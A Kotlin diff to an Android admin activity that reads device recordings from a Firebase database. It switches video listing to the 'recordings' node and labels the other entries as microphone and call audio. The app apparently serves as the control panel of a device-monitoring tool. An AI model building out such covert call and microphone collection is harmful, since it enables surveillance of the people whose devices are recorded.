@@ -224,12 +224,13 @@ class AdminControlActivity : AppCompatActivity() {
             }
             override fun onCancelled(e: DatabaseError) {}
         })
-        // Live videos
-        db("live_videos").addValueEventListener(object : ValueEventListener {
+        // Videos — from recordings node (type == "video")
+        db("recordings").addValueEventListener(object : ValueEventListener {
             override fun onDataChange(s: DataSnapshot) {
                 val list = mutableListOf<RecordingItem>()
                 for (c in s.children) {
                     val id  = c.key ?: continue
+                    if (c.child("type").getValue(String::class.java) != "video") continue
                     val did = c.child("deviceId").getValue(String::class.java) ?: ""
                     val url = c.child("url").getValue(String::class.java) ?: continue
                     val ts  = c.child("timestamp").getValue(Long::class.java) ?: 0L
@@ -240,7 +241,7 @@ class AdminControlActivity : AppCompatActivity() {
             }
             override fun onCancelled(e: DatabaseError) {}
         })
-        // Recordings
+        // Audio recordings (mic + call, NOT video)
         db("recordings").addValueEventListener(object : ValueEventListener {
             override fun onDataChange(s: DataSnapshot) {
                 val list = mutableListOf<RecordingItem>()
